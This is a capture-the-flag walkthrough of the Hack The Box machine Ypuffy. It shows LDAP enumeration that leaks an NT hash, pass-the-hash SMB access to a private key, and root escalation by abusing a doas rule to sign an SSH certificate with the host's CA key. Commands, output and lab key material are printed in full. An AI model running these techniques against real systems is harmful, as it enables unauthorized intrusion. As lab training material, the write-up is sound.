---
title: "[HTB] Machine: Ypuffy"
description: "[HTB] Machine: Ypuffy"
date: 2023-10-22
menu:
  sidebar:
    name: "[HTB] Machine: Ypuffy"
    identifier: htb-machine-Ypuffy
    parent: htb-machines-linux
    weight: 10
hero: images/ypuffy.png
tags: ["HTB", "ldap", "ssh", "ssh-keygen", "doas", "sudo", "certificate", "certificate-authority", "authorizedkeyscommand"]
---

# Ypuffy
## Enumeration
- `nmap`
```
└─$ nmap -Pn -p- 10.10.10.107                
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 19:54 BST
Stats: 0:06:07 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 41.38% done; ETC: 20:09 (0:08:34 remaining)
Nmap scan report for 10.10.10.107 (10.10.10.107)
Host is up (0.17s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
389/tcp open  ldap
445/tcp open  microsoft-ds

```
```
└─$ nmap -Pn -p22,80,139,389,445 -sC -sV 10.10.10.107 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-23 20:22 BST
Nmap scan report for 10.10.10.107 (10.10.10.107)
Host is up (0.15s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 (RSA)
|   256 dd:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 (ECDSA)
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 (ED25519)
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: YPUFFY)
389/tcp open  ldap        (Anonymous bind OK)
445/tcp open  �hv^�U      Samba smbd 4.7.6 (workgroup: YPUFFY)
Service Info: Host: YPUFFY

Host script results:
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6)
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY\x00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System time: 2023-10-23T15:22:21-04:00
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-10-23T19:22:22
|_  start_date: N/A
|_clock-skew: mean: 1h19m11s, deviation: 2h18m34s, median: -48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.85 seconds

```

- Web server

![](./images/1.png)

- `ldap`
```
└─$ ldapsearch -H ldap://10.10.10.107 -x -s base namingcontexts           
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: dc=hackthebox,dc=htb

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```
```
└─$ ldapsearch -H ldap://10.10.10.107 -x -b "dc=hackthebox,dc=htb"
# extended LDIF
#
# LDAPv3
# base <dc=hackthebox,dc=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# hackthebox.htb
dn: dc=hackthebox,dc=htb
dc: hackthebox
objectClass: top
objectClass: domain

# passwd, hackthebox.htb
dn: ou=passwd,dc=hackthebox,dc=htb
ou: passwd
objectClass: top
objectClass: organizationalUnit

# bob8791, passwd, hackthebox.htb
dn: uid=bob8791,ou=passwd,dc=hackthebox,dc=htb
uid: bob8791
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: e0JTREFVVEh9Ym9iODc5MQ==
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob8791
loginShell: /bin/ksh

# alice1978, passwd, hackthebox.htb
dn: uid=alice1978,ou=passwd,dc=hackthebox,dc=htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: [U          ]
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644

# group, hackthebox.htb
dn: ou=group,dc=hackthebox,dc=htb
ou: group
objectClass: top
objectClass: organizationalUnit

# bob8791, group, hackthebox.htb
dn: cn=bob8791,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: bob8791
userPassword:: e2NyeXB0fSo=
gidNumber: 5001

# alice1978, group, hackthebox.htb
dn: cn=alice1978,ou=group,dc=hackthebox,dc=htb
objectClass: posixGroup
objectClass: top
cn: alice1978
userPassword:: e2NyeXB0fSo=
gidNumber: 5000

# ypuffy, hackthebox.htb
dn: sambadomainname=ypuffy,dc=hackthebox,dc=htb
sambaDomainName: YPUFFY
sambaSID: S-1-5-21-3933741069-3307154301-3557023464
sambaAlgorithmicRidBase: 1000
objectclass: sambaDomain
sambaNextUserRid: 1000
sambaMinPwdLength: 5
sambaPwdHistoryLength: 0
sambaLogonToChgPwd: 0
sambaMaxPwdAge: -1
sambaMinPwdAge: 0
sambaLockoutDuration: 30
sambaLockoutObservationWindow: 30
sambaLockoutThreshold: 0
sambaForceLogoff: -1
sambaRefuseMachinePwdChange: 0
sambaNextRid: 1001

# search result
search: 2
result: 0 Success

# numResponses: 9
# numEntries: 8

```

- `smb`
```
└─$ smbclient -N -L //10.10.10.107                            
Anonymous login successful
tree connect failed: NT_STATUS_ACCESS_DENIED
```

## Foothold
- We found users via `ldapsearch`
  - Passwords are not visible, but we have a `hash`
  - Connect to `smb` using hash

```
└─$ smbclient  -L //10.10.10.107 -U 'alice1978%0B186E661BBDBDCF6047784DE8B9FD8B' --pw-nt-hash

        Sharename       Type      Comment
        ---------       ----      -------
        alice           Disk      Alice's Windows Directory
        IPC$            IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------

```

- Inside `alice` share we find private key
```
└─$ smbclient //10.10.10.107/alice -U 'alice1978%0B186E661BBDBDCF6047784DE8B9FD8B' --pw-nt-hash
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul 31 03:54:20 2018
  ..                                  D        0  Wed Aug  1 04:16:50 2018
  my_private_key.ppk                  A     1460  Tue Jul 17 02:38:51 2018

                433262 blocks of size 1024. 411540 blocks available
smb: \> 
```
```
PuTTY-User-Key-File-2: ssh-rsa
Encryption: none
Comment: rsa-key-20180716
Public-Lines: 6
AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz
1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02qux
BoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAj
h7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/Sxa
iA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWx
ivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw==
Private-Lines: 14
AAABAH0knH2xprkuycHoh18sGrlvVGVG6C2vZ9PsiBdP/5wmhpYI3Svnn3ZL8CwF
VGaXdidhZunC9xmD1/QAgCgTz/Fh5yl+nGdeBWc10hLD2SeqFJoHU6SLYpOSViSE
cOZ5mYSy4IIRgPdJKwL6NPnrO+qORSSs9uKVqEdmKLm5lat9dRJVtFlG2tZ7tsma
hRM//9du5MKWWemJlW9PmRGY6shATM3Ow8LojNgnpoHNigB6b/kdDozx6RIf8b1q
Gs+gaU1W5FVehiV6dO2OjHUoUtBME01owBLvwjdV/1Sea/kcZa72TYIMoN1MUEFC
3hlBVcWbiy+O27JzmDzhYen0Jq0AAACBANTBwU1DttMKKphHAN23+tvIAh3rlNG6
m+xeStOxEusrbNL89aEU03FWXIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6
l4UVEuHUqnTfEOowVTcVNlwpNM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v
4L9aKFwiMZxfAAAAgQDG+o9xrh+rZuQg8BZ6ZcGGdszZITn797a4YU+NzxjP4jR+
qSVCTRky9uSP0i9H7B9KVnuu9AfzKDBgSH/zxFnJqBTTykM1imjt+y1wVa/3aLPh
hKxePlIrP3YaMKd38ss2ebeqWy+XJYwgWOsSw8wAQT7fIxmT8OYfJRjRGTS74QAA
AIEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2iI5c
QLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+Wuvl
xTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
Private-MAC: 208b4e256cd56d59f70e3594f4e2c3ca91a757c9
```

- It's a `putty` key, convert it via `puttygen`
```
└─$ puttygen priv.key -O private-openssh -o alice.key
```
```
└─$ cat alice.key                                                                                                                                                                                         
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR
+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A
0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIsk
Hqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMs
qpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1
adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/UfwIBJQKCAQB9JJx9saa5LsnB6Idf
LBq5b1RlRugtr2fT7IgXT/+cJoaWCN0r5592S/AsBVRml3YnYWbpwvcZg9f0AIAo
E8/xYecpfpxnXgVnNdISw9knqhSaB1Oki2KTklYkhHDmeZmEsuCCEYD3SSsC+jT5
6zvqjkUkrPbilahHZii5uZWrfXUSVbRZRtrWe7bJmoUTP//XbuTCllnpiZVvT5kR
mOrIQEzNzsPC6IzYJ6aBzYoAem/5HQ6M8ekSH/G9ahrPoGlNVuRVXoYlenTtjox1
KFLQTBNNaMAS78I3Vf9Unmv5HGWu9k2CDKDdTFBBQt4ZQVXFm4svjtuyc5g84WHp
9CatAoGBANTBwU1DttMKKphHAN23+tvIAh3rlNG6m+xeStOxEusrbNL89aEU03FW
XIocoQlPiQBr3s8OkgMk1QVYABlH30Y2ZsPL/hp6l4UVEuHUqnTfEOowVTcVNlwp
NM8YLhgn+JIeGpJZqus5JK/pBhK0JclenIpH5M2v4L9aKFwiMZxfAoGBAMb6j3Gu
H6tm5CDwFnplwYZ2zNkhOfv3trhhT43PGM/iNH6pJUJNGTL25I/SL0fsH0pWe670
B/MoMGBIf/PEWcmoFNPKQzWKaO37LXBVr/dos+GErF4+Uis/dhowp3fyyzZ5t6pb
L5cljCBY6xLDzABBPt8jGZPw5h8lGNEZNLvhAoGAUICqAY8+QgPYw/8wwpikG88j
ZURh0tD8uk0xEdRMWPusotxBQ95d19t89fz+qZO3TER90c4paPkuAgWfLCkIX8GO
qvM9jXp+hWHreAtHan3quXoSZ96DRXdgFwI69GIms9QKDdy9NmimGQwQIsC0Wggf
jkS3cGwP2bNpN548SQECgYEAvDkf6BNqENbzeRp2IMEe2SRFPBiC9URFD0dLQPRV
vbpNVTg4AHJxyG0BuHq3GoVptQWzRKGmp747mVlWcPgB6EUMyFeLry/mt5qSxDVh
Q/tCX7TaZvyul5zlVwtt+9fU/C3y7UGAC4Rh9RXXcp2Jn2BQOtwDcES+AcklUCyZ
qs0CgYEAiOHSABguzA8sMxaHMvWu16F0RKXLOy+S3ZbMrQZr+nDyzHYPaLDRtNE2
iI5cQLr38t6CRO6zEZ+08Zh5rbqLJ1n8i/q0Pv+nYoYlocxw3qodwUlUYcr1/sE+
WuvlxTwgKNIb9U6L6OdSr5FGkFBCFldtZ/WSHtbHxBabb0zpdts=
-----END RSA PRIVATE KEY-----

```

- Now, we can connect to `ssh`
```
└─$ ssh alice1978@10.10.10.107 -i alice.key 
Warning: Permanently added '10.10.10.107' (ED25519) to the list of known hosts.
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy$ whoami
alice1978
ypuffy$ 
```
## Root
- It's a `OpenBSD` box
  - `ssh` config
  - Looks like `ssh` allows `ssh` connection via certificates signed by `CA`
```
...
PermitRootLogin prohibit-password
#StrictModes yes
#MaxAuthTries 6
#MaxSessions 10

#PubkeyAuthentication yes

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      .ssh/authorized_keys

#AuthorizedPrincipalsFile none

AuthorizedKeysCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=keys&username=%u
AuthorizedKeysCommandUser nobody

TrustedUserCAKeys /home/userca/ca.pub
AuthorizedPrincipalsCommand /usr/local/bin/curl http://127.0.0.1/sshauth?type=principals&username=%u
AuthorizedPrincipalsCommandUser nobody

# For this to work you will also need host keys in /etc/ssh/ssh_known_hosts
#HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
#IgnoreUserKnownHosts no
# Don't read the user's ~/.rhosts and ~/.shosts files
#IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
#PermitEmptyPasswords no
...
```

- From the config file we see `userca` contains `CA` keys
  - Both private and public
  - https://engineering.fb.com/2016/09/12/security/scalable-and-secure-access-with-ssh/
```
ypuffy$ ls -lha /home/userca/                                                                                                                                                                                                              
total 44
drwxr-xr-x  3 userca  userca   512B Jul 30  2018 .
drwxr-xr-x  5 root    wheel    512B Jul 30  2018 ..
-rw-r--r--  1 userca  userca    87B Jul 30  2018 .Xdefaults
-rw-r--r--  1 userca  userca   771B Jul 30  2018 .cshrc
-rw-r--r--  1 userca  userca   101B Jul 30  2018 .cvsrc
-rw-r--r--  1 userca  userca   359B Jul 30  2018 .login
-rw-r--r--  1 userca  userca   175B Jul 30  2018 .mailrc
-rw-r--r--  1 userca  userca   215B Jul 30  2018 .profile
drwx------  2 userca  userca   512B Jul 30  2018 .ssh
-r--------  1 userca  userca   1.6K Jul 30  2018 ca
-r--r--r--  1 userca  userca   410B Jul 30  2018 ca.pub
```

- We can test the url in `AuthorizedKeysCommand` from the config
  - The key matches the one I got from `smb`
```
ypuffy$ curl 'http://127.0.0.1/sshauth?type=keys&username=alice1978'
ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEApV4X7z0KBv3TwDxpvcNsdQn4qmbXYPDtxcGz1am2V3wNRkKR+gRb3FIPp+J4rCOS/S5skFPrGJLLFLeExz7Afvg6m2dOrSn02quxBoLMq0VSFK5A0Ep5Hm8WZxy5wteK3RDx0HKO/aCvsaYPJa2zvxdtp1JGPbN5zBAjh7U8op4/lIskHqr7DHtYeFpjZOM9duqlVxV7XchzW9XZe/7xTRrbthCvNcSC/SxaiA2jBW6n3dMsqpB8kq+b7RVnVXGbBK5p4n44JD2yJZgeDk+1JClS7ZUlbI5+6KWxivAMf2AqY5e1adjpOfo6TwmB0Cyx0rIYMvsog3HnqyHcVR/Ufw== rsa-key-20180716
```

- Curling `AuthorizedPrincipalsCommand` returns usernames
```
ypuffy$ curl 'http://127.0.0.1/sshauth?type=principals&username=alice1978'
alice1978
ypuffy$ curl 'http://127.0.0.1/sshauth?type=principals&username=bob8791'   
bob8791
ypuffy$ 
```

- Strangely, if we try it on `root` user we receive back `3m3rgencyB4ckd00r` principal
```
ypuffy$ curl 'http://127.0.0.1/sshauth?type=principals&username=root'    
3m3rgencyB4ckd00r
```

- Let's also check `sudo`/`doas` rights
  - `alice1978` can run `ssh-keygen` as `userca`
```
ypuffy$ cat /etc/doas.conf                                                                                                                                                                                                                 
permit keepenv :wheel
permit nopass alice1978 as userca cmd /usr/bin/ssh-keygen
```

- We can generate signed certificate with what we have 
  - Generate a key
```
ypuffy$ cd /home/alice1978/                                                                                                                                                                                                                
ypuffy$ mkdir pwn 
ypuffy$ chmod 777 pwn
ypuffy$ cd pwn/                                                                                                                                                                                                                            
ypuffy$ ssh-keygen -f id_rsa.root
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in id_rsa.root.
Your public key has been saved in id_rsa.root.pub.
The key fingerprint is:
SHA256:R7n4q5LHftp5TTy55eJ/jaGCvkXMx8Kw9vBMJxZ4+AU alice1978@ypuffy.hackthebox.htb
The key's randomart image is:
+---[RSA 2048]----+
|          E      |
|         o o     |
|        + = .    |
|         @ =     |
|        S & +. . |
|       . @ =  * .|
|       o .*  + B.|
|      o +oooo = +|
|       =*=+o ..oo|
+----[SHA256]-----+
ypuffy$ ls -lha
total 16
drwxrwxrwx  2 alice1978  alice1978   512B Oct 24 12:38 .
drwxr-x---  5 alice1978  alice1978   512B Oct 24 12:38 ..
-rw-------  1 userca     alice1978   1.6K Oct 24 12:38 id_rsa.root
-rw-r--r--  1 userca     alice1978   410B Oct 24 12:38 id_rsa.root.pub
```

- Now we generate a signed certificate
```
ypuffy$ doas -u userca /usr/bin/ssh-keygen -s /home/userca/ca -I pentest -n 3m3rgencyB4ckd00r -V +52w  id_rsa.root 
Signed user key id_rsa.root-cert.pub: id "pentest" serial 0 for 3m3rgencyB4ckd00r valid from 2023-10-24T12:44:00 to 2024-10-22T12:45:20
ypuffy$ ls -lha
total 20
drwxrwxrwx  2 alice1978  alice1978   512B Oct 24 12:45 .
drwxr-x---  5 alice1978  alice1978   512B Oct 24 12:38 ..
-rw-------  1 alice1978  alice1978   1.6K Oct 24 12:45 id_rsa.root
-rw-r--r--  1 userca     alice1978   1.5K Oct 24 12:45 id_rsa.root-cert.pub
-rw-r--r--  1 alice1978  alice1978   413B Oct 24 12:45 id_rsa.root.pub

```

- Use it to connect as `root`
```
ypuffy$ ssh -i id_rsa.root root@localhost                                                                                                                                                                                                  
OpenBSD 6.3 (GENERIC) #100: Sat Mar 24 14:17:45 MDT 2018

Welcome to OpenBSD: The proactively secure Unix-like operating system.

Please use the sendbug(1) utility to report bugs in the system.
Before reporting a bug, please try to reproduce it with the latest
version of the code.  With bug reports, please try to ensure that
enough information to reproduce the problem is enclosed, and if a
known fix for it exists, include that as well.

ypuffy# whoami                                                                                                                                                                                                                          
root
ypuffy# 

```